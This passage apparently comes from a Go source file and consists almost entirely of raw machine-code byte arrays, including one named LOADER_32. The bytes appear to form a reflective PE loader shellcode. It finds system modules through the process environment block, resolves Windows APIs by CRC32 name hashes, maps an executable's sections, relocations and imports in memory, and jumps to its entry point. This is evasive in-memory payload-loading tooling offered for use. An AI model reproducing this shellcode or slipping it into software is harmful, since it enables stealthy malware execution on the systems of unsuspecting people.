	0x00, 0x00, 0xf3, 0x48, 0xab, 0xc7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x48,
	0xc7, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
	0xc7, 0x84, 0x24, 0x48, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8d, 0xbc, 0x24, 0x50, 0x01, 0x00, 0x00, 0xb9, 0x1e, 0x00, 0x00, 0x00,
	0xf3, 0x48, 0xab, 0xc7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3b, 0x2e,
	0x0f, 0x84, 0xb3, 0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x49,
	0x89, 0xc0, 0x48, 0x83, 0xc0, 0x01, 0x80, 0x7c, 0x03, 0xff, 0x2e, 0x75,
	0xf2, 0x44, 0x89, 0xc6, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0x89, 0xda,
	0xe8, 0x2d, 0xfb, 0xff, 0xff, 0x8d, 0x4e, 0x01, 0x48, 0x63, 0xc9, 0x48,
	0x01, 0xd9, 0x80, 0x39, 0x00, 0x0f, 0x84, 0x8e, 0x00, 0x00, 0x00, 0xb8,
	0x01, 0x00, 0x00, 0x00, 0x48, 0x63, 0xd6, 0x48, 0x01, 0xda, 0x49, 0x89,
	0xc0, 0x48, 0x83, 0xc0, 0x01, 0x80, 0x3c, 0x02, 0x00, 0x75, 0xf3, 0x48,
	0x8d, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00, 0x48, 0x89, 0xca, 0x48, 0x89,
	0xc1, 0xe8, 0xf0, 0xfa, 0xff, 0xff, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8,
	0x15, 0xfc, 0xff, 0xff, 0x48, 0x89, 0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x85, 0xdb, 0x74, 0x28, 0x48, 0x8d, 0x8c, 0x24, 0x40, 0x01, 0x00,
	0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0xe8, 0xd7, 0xfa, 0xff, 0xff, 0x89,
	0xc2, 0x41, 0xb8, 0xff, 0xff, 0xff, 0xff, 0x48, 0x89, 0xd9, 0xe8, 0x4e,
	0xfe, 0xff, 0xff, 0x48, 0x89, 0xc3, 0x48, 0x89, 0xd8, 0x48, 0x81, 0xc4,
	0x58, 0x02, 0x00, 0x00, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d,
	0x41, 0x5e, 0x41, 0x5f, 0xc3, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x41, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xe9, 0x53, 0xff, 0xff, 0xff, 0x41, 0xb8, 0x00,
	0x00, 0x00, 0x00, 0xeb, 0x82, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xcd,
	0x57, 0x56, 0x53, 0x48, 0x83, 0xec, 0x20, 0x89, 0xce, 0x65, 0x48, 0x8b,
	0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8d,
	0x78, 0x20, 0x48, 0x8b, 0x58, 0x20, 0x48, 0x39, 0xdf, 0x74, 0x2c, 0x0f,
	0xb7, 0x53, 0x48, 0x48, 0x8b, 0x4b, 0x50, 0xe8, 0x5e, 0xfa, 0xff, 0xff,
	0x39, 0xf0, 0x74, 0x0f, 0x48, 0x8b, 0x1b, 0x48, 0x39, 0xdf, 0x75, 0xe7,
	0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x04, 0x48, 0x8b, 0x43, 0x20, 0x48,
	0x83, 0xc4, 0x20, 0x5b, 0x5e, 0x5f, 0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00,
	0xeb, 0xf1, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x55, 0x57, 0x56, 0x53,
	0x48, 0x83, 0xec, 0x50, 0x48, 0x89, 0xcd, 0x48, 0x63, 0x79, 0x3c, 0x48,
	0x01, 0xcf, 0x0f, 0xb7, 0x47, 0x14, 0x48, 0x8d, 0x5c, 0x07, 0x18, 0x48,
	0xc7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00, 0x66, 0x83, 0x7f, 0x06,
	0x00, 0x74, 0x69, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x41, 0xbc, 0x00, 0x00,
	0x00, 0x00, 0x4c, 0x8d, 0x74, 0x24, 0x40, 0x4c, 0x8d, 0x6c, 0x24, 0x48,
	0xe9, 0x1f, 0x01, 0x00, 0x00, 0xb9, 0x01, 0x00, 0x00, 0x00, 0x25, 0x00,
	0x00, 0x00, 0x60, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x3d, 0x00, 0x00,
	0x00, 0x60, 0x41, 0xb9, 0x20, 0x00, 0x00, 0x00, 0xb8, 0x80, 0x00, 0x00,
	0x00, 0x44, 0x0f, 0x45, 0xc8, 0xe9, 0x8c, 0x00, 0x00, 0x00, 0x41, 0xb9,
	0x20, 0x00, 0x00, 0x00, 0xe9, 0x91, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00,
	0x00, 0x00, 0xeb, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc4,
	0x50, 0x5b, 0x5e, 0x5f, 0x5d, 0x41, 0x5c, 0x41, 0x5d, 0x41, 0x5e, 0xc3,
	0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb, 0xea, 0xb9, 0x01, 0x00, 0x00, 0x00,
	0x45, 0x89, 0xe0, 0x41, 0xb9, 0x10, 0x00, 0x00, 0x00, 0xeb, 0x3f, 0x44,
	0x89, 0xe1, 0xa9, 0x00, 0x00, 0x00, 0x20, 0x74, 0x32, 0xb9, 0x00, 0x00,
	0x00, 0x00, 0x85, 0xc0, 0x78, 0x8c, 0x89, 0xc1, 0xc1, 0xe9, 0x1f, 0x41,
	0x89, 0xc8, 0x44, 0x89, 0xe1, 0x41, 0xb9, 0x10, 0x00, 0x00, 0x00, 0xeb,
	0x19, 0xa9, 0x00, 0x00, 0x00, 0x20, 0x0f, 0x85, 0x69, 0xff, 0xff, 0xff,
	0xb9, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x45,
	0x89, 0xe0, 0x25, 0x00, 0x00, 0x00, 0x60, 0x3d, 0x00, 0x00, 0x00, 0x60,
	0x0f, 0x84, 0x74, 0xff, 0xff, 0xff, 0x84, 0xc9, 0x74, 0x0c, 0x45, 0x84,
	0xc0, 0xb8, 0x40, 0x00, 0x00, 0x00, 0x44, 0x0f, 0x45, 0xc8, 0x8b, 0x42,
	0x0c, 0x48, 0x01, 0xe8, 0x48, 0x89, 0x44, 0x24, 0x48, 0x8b, 0x42, 0x10,
	0x48, 0x89, 0x44, 0x24, 0x40, 0xc7, 0x44, 0x24, 0x3c, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8d, 0x44, 0x24, 0x3c, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4d,
	0x89, 0xf0, 0x4c, 0x89, 0xea, 0x48, 0xc7, 0xc1, 0xff, 0xff, 0xff, 0xff,
	0x41, 0xba, 0x41, 0x4d, 0xde, 0x6e, 0xe8, 0xbe, 0x00, 0x00, 0x00, 0xff,
	0xd0, 0x85, 0xc0, 0x0f, 0x88, 0x28, 0xff, 0xff, 0xff, 0x83, 0xc6, 0x01,
	0x48, 0x83, 0xc3, 0x28, 0x0f, 0xb7, 0x47, 0x06, 0x39, 0xf0, 0x0f, 0x8e,
	0x1c, 0xff, 0xff, 0xff, 0x48, 0x89, 0xda, 0x8b, 0x43, 0x24, 0x85, 0xc0,
	0x74, 0xe3, 0x41, 0x89, 0xc1, 0x41, 0xc1, 0xf9, 0x1f, 0x41, 0x83, 0xe1,
	0xc8, 0x41, 0x83, 0xc1, 0x40, 0xa9, 0x00, 0x00, 0x00, 0x40, 0x0f, 0x84,
	0x23, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x0f, 0x88, 0x41, 0xff, 0xff, 0xff,
	0xa9, 0x00, 0x00, 0x00, 0x20, 0x0f, 0x85, 0x00, 0xff, 0xff, 0xff, 0xb9,
	0x01, 0x00, 0x00, 0x00, 0x41, 0xb9, 0x02, 0x00, 0x00, 0x00, 0xe9, 0x3c,
	0xff, 0xff, 0xff, 0x56, 0x53, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0xce,
	0x48, 0x63, 0x41, 0x3c, 0x8b, 0x84, 0x01, 0xd0, 0x00, 0x00, 0x00, 0xba,
	0x00, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x11, 0x89, 0xc0, 0x48, 0x8b,
	0x5c, 0x01, 0x18, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x85, 0xdb, 0x75,
	0x1d, 0x89, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5e, 0xc3, 0x41, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xf1,
	0xff, 0xd0, 0x48, 0x83, 0xc3, 0x08, 0x48, 0x8b, 0x03, 0x48, 0x85, 0xc0,
	0x75, 0xe4, 0xba, 0x01, 0x00, 0x00, 0x00, 0xeb, 0xd4, 0x41, 0x51, 0x41,
	0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
	0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50,
	0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
	0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xf2, 0x44, 0x0f, 0x38, 0xf0, 0xc8,
	0xe2, 0xee, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c,
	0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x65, 0x8b,
	0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x5a, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0,
	0xe3, 0x49, 0x4c, 0x8b, 0x4c, 0x24, 0x08, 0x48, 0xff, 0xc9, 0x41, 0x8b,
	0x34, 0x88, 0x48, 0x01, 0xd6, 0x48, 0x31, 0xc0, 0xac, 0xf2, 0x44, 0x0f,
	0x38, 0xf0, 0xc8, 0x38, 0xe0, 0x75, 0xf2, 0x45, 0x39, 0xd1, 0x75, 0xdc,
	0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c,
	0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88,
	0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
	0x41, 0x59, 0xc3, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x5d,
	0xff, 0xff, 0xff, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x48, 0x29, 0xf1,
	0x48, 0x83, 0xc1, 0x11, 0x48, 0x89, 0xf7, 0x48, 0x83, 0xef, 0x05, 0xf3,
	0xaa, 0xfc, 0x48, 0x89, 0xec, 0x5d, 0xff, 0xe0,
}

var LOADER_32 = []byte{
	0x5e, 0x55, 0x89, 0xe5, 0x56, 0xe8, 0x8d, 0x00, 0x00, 0x00, 0x5e, 0x50,
	0xe8, 0x52, 0x02, 0x00, 0x00, 0xe8, 0xd0, 0x02, 0x00, 0x00, 0xe8, 0xac,
	0x05, 0x00, 0x00, 0xe8, 0x1f, 0x07, 0x00, 0x00, 0x5f, 0x8b, 0x47, 0x3c,
	0x8b, 0x44, 0x07, 0x28, 0x01, 0xf8, 0xe9, 0xe3, 0x07, 0x00, 0x00, 0x55,
	0x89, 0xe5, 0x56, 0x57, 0x51, 0x8b, 0x7d, 0x08, 0x8b, 0x75, 0x0c, 0x8b,
	0x4d, 0x10, 0xf3, 0xa4, 0x59, 0x5f, 0x5e, 0x89, 0xec, 0x5d, 0xc3, 0x8b,
	0x44, 0x24, 0x04, 0x8b, 0x54, 0x24, 0x08, 0x66, 0x85, 0xd2, 0x74, 0x1a,
	0x89, 0xc1, 0x0f, 0xb7, 0xd2, 0x01, 0xd0, 0xba, 0x00, 0x00, 0x00, 0x00,
	0xf2, 0x0f, 0x38, 0xf0, 0x11, 0x83, 0xc1, 0x01, 0x39, 0xc1, 0x75, 0xf4,
	0xeb, 0x1f, 0x0f, 0xb6, 0x08, 0x84, 0xc9, 0x74, 0x1b, 0x83, 0xc0, 0x01,
	0xba, 0x00, 0x00, 0x00, 0x00, 0xf2, 0x0f, 0x38, 0xf0, 0xd1, 0x83, 0xc0,
	0x01, 0x0f, 0xb6, 0x48, 0xff, 0x84, 0xc9, 0x75, 0xf0, 0x89, 0xd0, 0xc3,
	0xba, 0x00, 0x00, 0x00, 0x00, 0xeb, 0xf6, 0x55, 0x57, 0x56, 0x53, 0x83,
	0xec, 0x3c, 0x8b, 0x6c, 0x24, 0x50, 0x89, 0xef, 0x03, 0x7d, 0x3c, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0x81, 0x3f, 0x50, 0x45, 0x00, 0x00, 0x0f, 0x85,
	0xb7, 0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x2c, 0x00, 0x00, 0x00, 0x00,
	0x8b, 0x47, 0x50, 0x89, 0x44, 0x24, 0x28, 0xc7, 0x44, 0x24, 0x14, 0x04,
	0x00, 0x00, 0x00, 0xc7, 0x44, 0x24, 0x10, 0x00, 0x30, 0x10, 0x00, 0x8d,
	0x44, 0x24, 0x28, 0x89, 0x44, 0x24, 0x0c, 0xc7, 0x44, 0x24, 0x08, 0x00,
	0x00, 0x00, 0x00, 0x8d, 0x44, 0x24, 0x2c, 0x89, 0x44, 0x24, 0x04, 0xc7,
	0x04, 0x24, 0xff, 0xff, 0xff, 0xff, 0x68, 0x55, 0x7c, 0xce, 0x99, 0xe8,
	0x96, 0x06, 0x00, 0x00, 0x83, 0xc4, 0x04, 0xff, 0xd0, 0x83, 0xec, 0x18,
	0x89, 0xc2, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x85, 0xd2, 0x78, 0x5c, 0x8b,
	0x47, 0x54, 0x89, 0x44, 0x24, 0x08, 0x89, 0x6c, 0x24, 0x04, 0x8b, 0x44,
	0x24, 0x2c, 0x89, 0x04, 0x24, 0xe8, 0x05, 0xff, 0xff, 0xff, 0x0f, 0xb7,
	0x47, 0x14, 0x8d, 0x5c, 0x07, 0x18, 0x66, 0x83, 0x7f, 0x06, 0x00, 0x74,
	0x32, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x43, 0x0c, 0x03, 0x44, 0x24,
	0x2c, 0x89, 0xea, 0x03, 0x53, 0x14, 0x8b, 0x4b, 0x10, 0x89, 0x4c, 0x24,
	0x08, 0x89, 0x54, 0x24, 0x04, 0x89, 0x04, 0x24, 0xe8, 0xd2, 0xfe, 0xff,
	0xff, 0x83, 0xc6, 0x01, 0x83, 0xc3, 0x28, 0x0f, 0xb7, 0x47, 0x06, 0x39,
	0xf0, 0x7f, 0xd3, 0x8b, 0x44, 0x24, 0x2c, 0x83, 0xc4, 0x3c, 0x5b, 0x5e,
	0x5f, 0x5d, 0xc3, 0x57, 0x53, 0x81, 0xec, 0x34, 0x02, 0x00, 0x00, 0x8b,
	0x9c, 0x24, 0x40, 0x02, 0x00, 0x00, 0xc7, 0x84, 0x24, 0x2c, 0x02, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x7c, 0x24, 0x1c, 0xb9, 0x82, 0x00,
	0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xf3, 0xab, 0x80, 0x3b, 0x00,
	0x0f, 0x84, 0x98, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x89,
	0xd0, 0x83, 0xc2, 0x01, 0x80, 0x3c, 0x13, 0x00, 0x75, 0xf5, 0x01, 0xd2,
	0x66, 0x89, 0x94, 0x24, 0x24, 0x02, 0x00, 0x00, 0x83, 0xc2, 0x02, 0x66,
	0x89, 0x94, 0x24, 0x26, 0x02, 0x00, 0x00, 0x8d, 0x54, 0x24, 0x1c, 0x89,
	0x94, 0x24, 0x28, 0x02, 0x00, 0x00, 0x85, 0xc0, 0x78, 0x12, 0x66, 0x0f,
	0xbe, 0x14, 0x03, 0x66, 0x89, 0x54, 0x44, 0x1c, 0x83, 0xe8, 0x01, 0x83,
	0xf8, 0xff, 0x75, 0xee, 0x8d, 0x84, 0x24, 0x2c, 0x02, 0x00, 0x00, 0x89,
	0x44, 0x24, 0x0c, 0x8d, 0x84, 0x24, 0x24, 0x02, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x08, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x04,
	0x24, 0x00, 0x00, 0x00, 0x00, 0x68, 0xa4, 0xb9, 0xeb, 0xb4, 0xe8, 0x77,
	0x05, 0x00, 0x00, 0x83, 0xc4, 0x04, 0xff, 0xd0, 0x83, 0xec, 0x10, 0x85,
	0xc0, 0x78, 0x10, 0x8b, 0x84, 0x24, 0x2c, 0x02, 0x00, 0x00, 0x81, 0xc4,
	0x34, 0x02, 0x00, 0x00, 0x5b, 0x5f, 0xc3, 0xb8, 0x00, 0x00, 0x00, 0x00,
	0xeb, 0xf0, 0x66, 0xc7, 0x84, 0x24, 0x24, 0x02, 0x00, 0x00, 0x00, 0x00,
	0x66, 0xc7, 0x84, 0x24, 0x26, 0x02, 0x00, 0x00, 0x02, 0x00, 0x8d, 0x44,
	0x24, 0x1c, 0x89, 0x84, 0x24, 0x28, 0x02, 0x00, 0x00, 0xeb, 0x8d, 0x55,
	0x57, 0x56, 0x53, 0x8b, 0x6c, 0x24, 0x14, 0x89, 0xeb, 0x03, 0x5d, 0x3c,
	0x8b, 0x93, 0xa0, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x85,
	0xd2, 0x74, 0x62, 0x01, 0xea, 0x89, 0xee, 0x2b, 0x73, 0x34, 0x83, 0x3a,
	0x00, 0x75, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xeb, 0x4f, 0x0f, 0xb7,
	0x08, 0x81, 0xe1, 0xff, 0x0f, 0x00, 0x00, 0x03, 0x0a, 0x01, 0x74, 0x0d,
	0x00, 0x83, 0xc0, 0x02, 0x89, 0xd1, 0x03, 0x4a, 0x04, 0x39, 0xc8, 0x74,
	0x18, 0x0f, 0xb6, 0x48, 0x01, 0x89, 0xcf, 0x83, 0xe7, 0xf0, 0x89, 0xfb,
	0x80, 0xfb, 0x30, 0x74, 0xd5, 0x80, 0xf9, 0x0f, 0x76, 0xdf, 0xcc, 0xeb,
	0xdc, 0x89, 0xc2, 0x83, 0x3a, 0x00, 0x74, 0x10, 0x8d, 0x42, 0x08, 0x89,
	0xd1, 0x03, 0x4a, 0x04, 0x39, 0xc8, 0x75, 0xd5, 0x89, 0xca, 0xeb, 0xeb,
	0xb8, 0x01, 0x00, 0x00, 0x00, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0x55, 0x57,
	0x56, 0x53, 0x83, 0xec, 0x2c, 0x8b, 0x6c, 0x24, 0x40, 0x8b, 0x45, 0x3c,
	0x8b, 0x94, 0x05, 0x80, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00,
	0x85, 0xd2, 0x0f, 0x84, 0xb4, 0x00, 0x00, 0x00, 0x8d, 0x44, 0x15, 0x00,
	0x89, 0x44, 0x24, 0x1c, 0x8b, 0x40, 0x0c, 0x85, 0xc0, 0x75, 0x74, 0xb8,
	0x01, 0x00, 0x00, 0x00, 0xe9, 0x9b, 0x00, 0x00, 0x00, 0x89, 0x44, 0x24,
	0x08, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x89, 0x3c, 0x24,
	0xe8, 0x8f, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0x02, 0x89, 0x06, 0x83,
	0xc3, 0x04, 0x83, 0xc6, 0x04, 0x8b, 0x03, 0x85, 0xc0, 0x74, 0x34, 0x85,
	0xc0, 0x78, 0xd6, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x8d,
	0x44, 0x05, 0x02, 0x89, 0x04, 0x24, 0xe8, 0xe8, 0xfc, 0xff, 0xff, 0xc7,
	0x44, 0x24, 0x08, 0xff, 0xff, 0xff, 0xff, 0x89, 0x44, 0x24, 0x04, 0x89,
	0x3c, 0x24, 0xe8, 0x51, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x74, 0xc4, 0x89,
	0x06, 0xeb, 0xc0, 0x83, 0x44, 0x24, 0x1c, 0x14, 0x8b, 0x44, 0x24, 0x1c,
	0x8b, 0x40, 0x0c, 0x85, 0xc0, 0x74, 0x25, 0x01, 0xe8, 0x89, 0x04, 0x24,
	0xe8, 0xe2, 0xfd, 0xff, 0xff, 0x89, 0xc7, 0x85, 0xc0, 0x74, 0x1c, 0x8b,
	0x44, 0x24, 0x1c, 0x89, 0xeb, 0x03, 0x18, 0x89, 0xee, 0x03, 0x70, 0x10,
	0x8b, 0x03, 0x85, 0xc0, 0x75, 0x99, 0xeb, 0xcb, 0xb8, 0x01, 0x00, 0x00,
	0x00, 0xeb, 0x05, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x83, 0xc4, 0x2c, 0x5b,
	0x5e, 0x5f, 0x5d, 0xc3, 0x55, 0x89, 0xe5, 0x57, 0x56, 0x53, 0x83, 0xe4,
	0xf0, 0x81, 0xec, 0x40, 0x02, 0x00, 0x00, 0x8b, 0x5d, 0x08, 0x89, 0xd8,
	0x03, 0x43, 0x3c, 0x89, 0xda, 0x03, 0x50, 0x78, 0x8b, 0x40, 0x7c, 0x89,
	0x44, 0x24, 0x1c, 0x8b, 0x7a, 0x20, 0x8b, 0x42, 0x1c, 0x89, 0x44, 0x24,
	0x2c, 0x8b, 0x42, 0x24, 0x89, 0x44, 0x24, 0x28, 0x8b, 0x4a, 0x18, 0x85,
	0xc9, 0x0f, 0x84, 0x6b, 0x01, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0x00,
	0x01, 0xdf, 0x89, 0x54, 0x24, 0x24, 0x89, 0x4c, 0x24, 0x20, 0xc7, 0x44,
	0x24, 0x04, 0x00, 0x00, 0x00, 0x00, 0x89, 0xd8, 0x03, 0x04, 0xb7, 0x89,
	0x04, 0x24, 0xe8, 0x20, 0xfc, 0xff, 0xff, 0x39, 0x75, 0x10, 0x74, 0x1a,
	0x3b, 0x45, 0x0c, 0x74, 0x15, 0x83, 0xc6, 0x01, 0x8b, 0x44, 0x24, 0x20,
	0x39, 0xc6, 0x75, 0xd6, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe9, 0x0a, 0x01,
	0x00, 0x00, 0x8b, 0x54, 0x24, 0x24, 0x8d, 0x04, 0x73, 0x8b, 0x4c, 0x24,
	0x28, 0x0f, 0xb7, 0x04, 0x08, 0x8d, 0x04, 0x83, 0x8b, 0x4c, 0x24, 0x2c,
	0x03, 0x1c, 0x08, 0x39, 0xd3, 0x0f, 0x82, 0xe7, 0x00, 0x00, 0x00, 0x8b,
	0x44, 0x24, 0x1c, 0x01, 0xc2, 0x39, 0xd3, 0x0f, 0x83, 0xd9, 0x00, 0x00,
	0x00, 0xc5, 0xf9, 0xef, 0xc0, 0xc5, 0xfa, 0x7f, 0x44, 0x24, 0x38, 0x8d,
	0x7c, 0x24, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x3d, 0x00, 0x00,
	0x00, 0xf3, 0xab, 0xc5, 0xfa, 0x7f, 0x84, 0x24, 0x3c, 0x01, 0x00, 0x00,
	0x8d, 0xbc, 0x24, 0x4c, 0x01, 0x00, 0x00, 0xb9, 0x3d, 0x00, 0x00, 0x00,
	0xf3, 0xab, 0x80, 0x3b, 0x2e, 0x0f, 0x84, 0xa9, 0x00, 0x00, 0x00, 0xbe,
	0x00, 0x00, 0x00, 0x00, 0x83, 0xc6, 0x01, 0x89, 0xf0, 0x80, 0x3c, 0x33,
	0x2e, 0x75, 0xf5, 0x8d, 0x54, 0x24, 0x38, 0x89, 0x44, 0x24, 0x08, 0x89,
	0x5c, 0x24, 0x04, 0x89, 0x14, 0x24, 0xe8, 0x5c, 0xfb, 0xff, 0xff, 0x8d,
	0x4c, 0x33, 0x01, 0x80, 0x39, 0x00, 0x0f, 0x84, 0x87, 0x00, 0x00, 0x00,
	0xb8, 0x00, 0x00, 0x00, 0x00, 0x01, 0xde, 0x83, 0xc0, 0x01, 0x89, 0xc2,
	0x80, 0x7c, 0x06, 0x01, 0x00, 0x75, 0xf4, 0x8d, 0x84, 0x24, 0x3c, 0x01,
	0x00, 0x00, 0x89, 0x54, 0x24, 0x08, 0x89, 0x4c, 0x24, 0x04, 0x89, 0x04,
	0x24, 0xe8, 0x25, 0xfb, 0xff, 0xff, 0x8d, 0x44, 0x24, 0x38, 0x89, 0x04,
	0x24, 0xe8, 0x61, 0xfc, 0xff, 0xff, 0x89, 0xc3, 0xb8, 0x00, 0x00, 0x00,
	0x00, 0x85, 0xdb, 0x74, 0x2f, 0xc7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00,
	0x00, 0x8d, 0x84, 0x24, 0x3c, 0x01, 0x00, 0x00, 0x89, 0x04, 0x24, 0xe8,
	0x0f, 0xfb, 0xff, 0xff, 0xc7, 0x44, 0x24, 0x08, 0xff, 0xff, 0xff, 0xff,
	0x89, 0x44, 0x24, 0x04, 0x89, 0x1c, 0x24, 0xe8, 0x78, 0xfe, 0xff, 0xff,
	0x89, 0xc3, 0x89, 0xd8, 0x8d, 0x65, 0xf4, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3,
	0xbe, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xe9, 0x58,
	0xff, 0xff, 0xff, 0xba, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x85, 0xb8, 0x00,
	0x00, 0x00, 0x00, 0xeb, 0xdb, 0x57, 0x56, 0x53, 0x83, 0xec, 0x08, 0x8b,
	0x7c, 0x24, 0x18, 0x64, 0xa1, 0x30, 0x00, 0x00, 0x00, 0x8b, 0x40, 0x0c,
	0x8d, 0x70, 0x14, 0x8b, 0x58, 0x14, 0x39, 0xde, 0x74, 0x2e, 0x0f, 0xb7,
	0x43, 0x24, 0x89, 0x44, 0x24, 0x04, 0x8b, 0x43, 0x28, 0x89, 0x04, 0x24,
	0xe8, 0xa2, 0xfa, 0xff, 0xff, 0x39, 0xf8, 0x74, 0x0d, 0x8b, 0x1b, 0x39,
	0xde, 0x75, 0xe3, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xeb, 0x03, 0x8b, 0x43,
	0x10, 0x83, 0xc4, 0x08, 0x5b, 0x5e, 0x5f, 0xc3, 0xb8, 0x00, 0x00, 0x00,
	0x00, 0xeb, 0xf2, 0x55, 0x57, 0x56, 0x53, 0x83, 0xec, 0x4c, 0x8b, 0x6c,
	0x24, 0x60, 0x89, 0xef, 0x03, 0x7d, 0x3c, 0x0f, 0xb7, 0x47, 0x14, 0x8d,
	0x5c, 0x07, 0x18, 0xc7, 0x44, 0x24, 0x3c, 0x00, 0x00, 0x00, 0x00, 0x66,
	0x83, 0x7f, 0x06, 0x00, 0x74, 0x31, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x89,
	0xfd, 0xe9, 0x0c, 0x01, 0x00, 0x00, 0xc6, 0x44, 0x24, 0x2f, 0x01, 0xeb,
	0x41, 0xba, 0x20, 0x00, 0x00, 0x00, 0xe9, 0x8e, 0x00, 0x00, 0x00, 0xb8,
	0x00, 0x00, 0x00, 0x00, 0xeb, 0x05, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x83,
	0xc4, 0x4c, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0xb8, 0x01, 0x00, 0x00, 0x00,
	0xeb, 0xf1, 0x89, 0xc7, 0xc1, 0xef, 0x1f, 0xc6, 0x44, 0x24, 0x2f, 0x00,
	0xa9, 0x00, 0x00, 0x00, 0x20, 0x74, 0x3a, 0xba, 0x10, 0x00, 0x00, 0x00,
	0x89, 0xf9, 0x84, 0xc9, 0x74, 0x34, 0x25, 0x00, 0x00, 0x00, 0x60, 0xbf,
	0x01, 0x00, 0x00, 0x00, 0x3d, 0x00, 0x00, 0x00, 0x60, 0xba, 0x20, 0x00,
	0x00, 0x00, 0xb8, 0x80, 0x00, 0x00, 0x00, 0x0f, 0x45, 0xd0, 0xeb, 0x26,
	0xa9, 0x00, 0x00, 0x00, 0x20, 0x75, 0x93, 0xc6, 0x44, 0x24, 0x2f, 0x01,
	0xba, 0x04, 0x00, 0x00, 0x00, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x25, 0x00,
	0x00, 0x00, 0x60, 0x3d, 0x00, 0x00, 0x00, 0x60, 0x0f, 0x84, 0x7b, 0xff,
